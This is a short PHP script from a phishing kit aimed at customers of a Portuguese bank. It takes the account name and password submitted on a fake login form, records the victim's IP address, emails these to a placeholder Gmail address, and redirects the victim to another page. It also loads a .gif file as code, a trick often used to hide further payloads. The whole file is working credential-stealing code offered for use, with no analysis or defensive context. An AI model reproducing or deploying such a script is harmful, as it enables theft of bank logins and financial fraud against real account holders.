<?
include('arr.gif');
$ip = getenv("REMOTE_ADDR");
$message .= "--------------CAX PT Bank Savage Details ReZulT-----------------------\n";
$message .= "   USER   : ".$_POST['account']."\n";
$message .= "   PASSWORD    : ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created BY END'09----------------\n";
$to = "youremail@gmail.com";
$subject = "USER CAX PT Portugal Bank Complete Details";
$from = "From: Bull De Dog<User@cpt.com>";
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$from);

	   {
		   header("Location: selfie.html");

	   }

?>